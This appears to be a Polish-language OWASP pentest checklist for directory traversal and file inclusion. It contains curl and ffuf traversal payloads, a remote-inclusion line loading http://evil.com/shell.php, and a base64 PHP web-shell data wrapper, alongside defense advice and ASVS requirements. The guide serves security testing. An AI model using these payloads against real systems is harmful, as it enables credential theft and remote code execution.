# WSTG-ATHZ-01 — Testing Directory Traversal File Include

## Cele

- Identify injection points that pertain to path traversal
- Assess bypassing techniques and identify the extent of path traversal

## KOMENDY

### Podstawowe path traversal

```bash
curl -s "https://TARGET/file?path=../../../etc/passwd"
curl -s "https://TARGET/file?path=....//....//....//etc/passwd"
curl -s "https://TARGET/file?path=..%2f..%2f..%2fetc%2fpasswd"
curl -s "https://TARGET/file?path=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl -s "https://TARGET/file?path=..%252f..%252f..%252fetc%252fpasswd"
curl -s "https://TARGET/file?path=....\/....\/....\/etc/passwd"

```

### Null byte (starsze PHP)

```bash
curl -s "https://TARGET/file?path=../../../etc/passwd%00"
curl -s "https://TARGET/file?path=../../../etc/passwd%00.jpg"

```

### Windows paths

```bash
curl -s "https://TARGET/file?path=..\..\..\..\windows\win.ini"
curl -s "https://TARGET/file?path=..%5c..%5c..%5c..%5cwindows%5cwin.ini"

```

### dotdotpwn

```bash
dotdotpwn -m http -h TARGET -o unix -f /etc/passwd -k "root:" -d 8

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings Directory Traversal

```bash
ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/directory_traversal.txt" -mc all -o output_ffuf_traversal.json

ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/deep_traversal.txt" -mc all -o output_ffuf_deep_traversal.json

ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/dotdotpwn.txt" -mc all -o output_ffuf_dotdotpwn.json

ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/traversals-8-deep-exotic-encoding.txt" -mc all -o output_ffuf_exotic.json

```

### PayloadsAllTheThings File Inclusion

```bash
ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/File Inclusion/Intruders/JHADDIX_LFI.txt" -mc all -o output_ffuf_lfi_jhaddix.json

ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/File Inclusion/Intruders/Linux-files.txt" -mc all -o output_ffuf_lfi_linux.json

ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/File Inclusion/Intruders/Windows-files.txt" -mc all -o output_ffuf_lfi_windows.json

```

### SecLists LFI

```bash
ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/LFI/LFI-Jhaddix.txt -mc all -o output_ffuf_seclists_lfi.json

ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -mc all -o output_ffuf_seclists_lfi_linux.json

```

### fuzzdb path traversal

```bash
ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/path-traversal/traversals-8-deep-exotic-encoding.txt -mc all -o output_ffuf_fuzzdb_trav.json

ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/lfi/JHADDIX_LFI.txt -mc all -o output_ffuf_fuzzdb_lfi.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj parametry ladujace pliki (path=, file=, page=, include=, doc=)
2. Testuj ../../../etc/passwd i warianty encodowania
3. Sprawdz RFI: file?path=http://evil.com/shell.php
4. Testuj PHP wrappers: php://filter/convert.base64-encode/resource=index.php
5. Testuj bypass filtrow: podwojne kodowanie, null byte, sciezki UNC
6. Sprawdz PayloadsAllTheThings File Inclusion/README.md dla wrapperow


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Input_Validation_Cheat_Sheet.md, File_Upload_Cheat_Sheet.md

### Path Traversal — mechanizm ataku

- Atakujacy manipuluje sciezka pliku aby uzyskac dostep do plikow poza zamierzonym katalogiem
- Podstawowy payload: `../../../etc/passwd` — przechodzenie do katalogu nadrzednego
- Cel: odczyt plikow konfiguracyjnych, kodow zrodlowych, credentials, kluczy prywatnych
- W polaczeniu z LFI (Local File Inclusion): mozliwe **zdalne wykonanie kodu** (RCE)

### Techniki bypass filtrow

| Technika | Payload | Opis |
|----------|---------|------|
| Podwojne ../  | `....//....//etc/passwd` | Filtr usuwa `../` raz, zostaje `../` |
| URL encoding | `%2e%2e%2f` | Dekodowanie po walidacji |
| Double encoding | `%252e%252e%252f` | Podwojne dekodowanie |
| Null byte | `../../../etc/passwd%00.jpg` | PHP < 5.3.4 obcina po null byte |
| Backslash (Windows) | `..\..\..\..\windows\win.ini` | Windows path separator |
| UNC path | `\\evil.com\share\file` | Dostep do zdalnych zasobow |
| UTF-8 encoding | `..%c0%af..%c0%af` | Overlong UTF-8 encoding |

### Obrona — wielowarstwowa

- **Walidacja wejscia**: allowlist dozwolonych znakow (alfanumeryczne + kropka + myslnik)
- **Kanonizacja sciezki**: uzyj `realpath()`, `Path.normalize()` PRZED walidacja
- **Chroot/jail**: ograniczaj dostep do pliku do jednego katalogu
- **Nie uzywaj danych uzytkownika w sciezkach plikow** — mapuj na ID/hash
- **Odrzucaj**: `..`, `%2e`, null bytes, backslash, `://` w parametrach sciezki
- Po kanonizacji sprawdz czy sciezka **zaczyna sie od dozwolonego katalogu bazowego**

### LFI (Local File Inclusion) — dodatkowe wektory

- **PHP wrappers**: `php://filter/convert.base64-encode/resource=index.php` — odczyt kodu zrodlowego
- **PHP input**: `php://input` z POST body — wykonanie kodu
- **Data wrapper**: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`
- **Log poisoning**: wstrzyknij kod do log file, potem zaladuj log przez LFI
- **Session file inclusion**: `/tmp/sess_<session_id>` z wstrzyknietym payloadem
- **proc/self/environ**: zawiera HTTP headers — wstrzyknij payload w User-Agent

### RFI (Remote File Inclusion)

- `file?path=http://evil.com/shell.php` — zaladuj zdalny plik z kodem
- Wymaga `allow_url_include=On` w PHP (domyslnie wylaczone)
- Testuj rowniez z `https://`, `ftp://`, `gopher://`

### Pliki do testowania (cele path traversal)

| System | Plik | Zawartosc |
|--------|------|-----------|
| Linux | `/etc/passwd` | Lista uzytkownikow |
| Linux | `/etc/shadow` | Hashe hasel (wymaga root) |
| Linux | `/etc/hosts` | Konfiguracja DNS |
| Linux | `/proc/self/environ` | Zmienne srodowiskowe |
| Windows | `C:\windows\win.ini` | Konfiguracja Windows |
| Windows | `C:\windows\system32\config\SAM` | Baza hasel |
| Aplikacja | `WEB-INF/web.xml` | Konfiguracja Java |
| Aplikacja | `.env` | Zmienne srodowiskowe aplikacji |

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| off-by-slash | Wykrywanie alias traversal przez bledna konfiguracje NGINX | [GitHub](https://github.com/bayotop/off-by-slash) |
| 403Bypasser | Automatyczne techniki omijania restrykcji 403 | [GitHub](https://github.com/sting8k/BurpSuite_403Bypasser) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V5.3.2 | File Storage | Verify that when the application creates file paths for file operations, instead of user-submitted filenames, it uses internally generated or trusted data, or if user-submitted filenames or file metadata must be used, strict validation and sanitization must be applied. This is to protect against path traversal, local or remote file inclusion (LFI, RFI), and server-side request forgery (SSRF) attacks. |

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.3.6 | Sanitization | Verify that the application protects against Server-side Request Forgery (SSRF) attacks, by validating untrusted data against an allowlist of protocols, domains, paths and ports and sanitizing potentially dangerous characters before using the data to call another service. |

### L3 (Zaawansowany)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V5.3.3 | File Storage | Verify that server-side file processing, such as file decompression, ignores user-provided path information to prevent vulnerabilities such as zip slip. |
